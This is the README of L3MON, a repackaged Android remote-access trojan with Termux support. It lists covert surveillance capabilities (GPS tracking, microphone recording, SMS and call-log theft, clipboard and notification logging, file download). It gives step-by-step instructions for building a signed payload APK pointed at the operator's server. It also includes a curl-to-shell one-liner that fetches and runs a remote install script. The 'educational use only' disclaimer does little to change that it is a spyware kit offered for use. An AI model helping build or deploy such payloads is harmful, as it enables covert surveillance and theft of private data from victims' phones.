# Deleted by owner it may not work, Get Updates on <a href="https://t.me/BhartiyaHacker">TELEGRAM (only for education)</a>.
<p align="center">

A cloud-based remote Android management suite, powered by NodeJS 
</p>
<p> I as <a href="https://www.youtube.com/c/BhartiyaHacker">Bhartiya Hacker</a> do not pressurize the Lemon tool in any way. Our moral obligation is to send all types of rights and donations directly to the original crater. I sincerely thank you for allowing me to upload this tool to my GitHub. I have enabled Lemon to support termux with a few minor changes.</p>

<p>Now users no longer need to sign the lemon payload using Apk Editor. If you are a Termux user, you will be able to easily build the payload of Lemon with the help of this repository, as well as use it in Kali Linux and Ubuntu without any errors. If you are a Kali or Ubuntu user, you need to have Java8 Installed on your machine or follow the rootless installation.</p>

<p>The only way to help me is to visit my YouTube channel and subscribe to my channel, leave your comments on our videos, and follow me on GitHub. Looking forward to your cooperation.</p>


## L3MON Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder

## Prerequisites 
 - Java Runtime Environment 8
    - See <a href="https://www.oracle.com/in/java/technologies/javase/javase8-archive-downloads.html">installation</a> for OS specifics
 - NodeJs 
 - A Server

## Installation kali/debian/ubuntu
1. Install JRE 8 (I cannot stress this enough USE java 1.8.0 ANY issues that don't use this will be closed WITHOUT a response)
    - Debian, Ubuntu, Etc
     - Ubuntu chroot
        - `sudo apt install wget curl git npm nano nodejs openjdk-8-jdk openjdk-8-jre`
        - `sudo apt install apktool apksigner zipalign`
    - Fedora, Oracle, Red Hat, etc
        -  `su -c "yum install java-1.8.0-openjdk"`

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `npm install pm2 -g`
4. clone this repository and GO into `l3mon` Directory and then run belom commands:
    - `npm install`
    - `npm audit fix`
    - `npm audit`
5. Start the server 'pm2 start index.js'
6. Stop the server 'pm2 stop index.js'

# Termux Installation: Automatic Installation: just copy & paste below command & Grab a Coffe (:
````bash
curl -s https://raw.githubusercontent.com/Bhartiya-Hacker/L3MON/master/termux_install.sh | sh
````
  Or
- git clone https://github.com/Bhartiya-Hacker/L3MON
- cd L3MON
- chmod +x termux_install.sh
- ./termux_install.sh

# How to run L3MON in TERMUX:
    . To start server type 'l3mon'
    . To stop the server type 'l3monx'
    . To start payload builder WITHOUT JAVA 8, type 'l3monb', then enter your IP & port. :D

# Termux Payload Builder (No JAVA 8 Required) CHEERS!
    . To run the builder type `l3monb`
    . Enter your Host/IP & PORT
    . Press Enter & wait for few seconds
    . l3mon_Signed.apk Payload can be FOUND under HOME/l3mon_output. :D
# NOTE: if 'l3mon_output' Folder not found at $HOME dir. then check if 'APKTOOL' properly installed or not by running 'apktool -v'

## Thanks
L3MON Builds off and utilizes several opensource software, Without these, L3MON Wouldn't be what it is!
 - Inspiration for the project and the basic building blocks for the Android App are based on [AhMyth](https://github.com/AhMyth/AhMyth-Android-RAT) 
 - [express](https://github.com/expressjs/express)
 - [node-geoip](https://github.com/bluesmoon/node-geoip)
 - [lowdb](https://github.com/typicode/lowdb)
 - [socket.io](https://github.com/socketio/socket.io)
 - [Open Street Map](https://www.openstreetmap.org)
 - [Leaflet](https://leafletjs.com/)

## Disclaimer
<b>D3VL Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
L3MON is built for both Educational and Internal use ONLY.</b>

<br>
<p align="center">Made with ❤️ By <a href="//d3vl.com">D3VL</a></p>
<p align="center" style="font-size: 8px">v1.1.2 <a href="https://github.com/D3VL/L3MON">Credit!</a></p>
